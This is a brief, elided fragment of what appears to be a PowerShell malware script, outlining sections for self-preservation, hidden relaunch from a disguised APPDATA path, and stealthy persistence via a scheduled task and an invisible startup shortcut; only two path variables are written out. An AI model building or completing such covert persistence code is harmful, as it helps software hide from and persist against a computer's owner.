...
# === SELF-PRESERVATION + HIDDEN RE-LAUNCH ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

# If running visibly, immediately hide and relaunch
...
# === PERSISTENCE: Scheduled Task (max stealth) ===
...
# === PERSISTENCE: Startup LNK (invisible) ===
